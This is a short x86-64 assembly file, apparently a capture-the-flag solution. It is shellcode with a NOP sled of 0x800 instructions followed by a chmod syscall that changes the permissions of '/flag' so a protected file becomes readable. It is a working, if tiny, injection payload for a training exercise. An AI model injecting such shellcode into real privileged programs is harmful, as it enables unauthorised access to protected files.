.intel_syntax noprefix
.global _start

_start:
    .rept 0x800 # fixed value to skip from
       nop
    .endr
    lea rdi, [rip + _flag_addr]
    mov rsi, 7 # rw
    mov rax, 90 # chmod x64 syscall
    syscall

_flag_addr:
 .ascii "/flag"

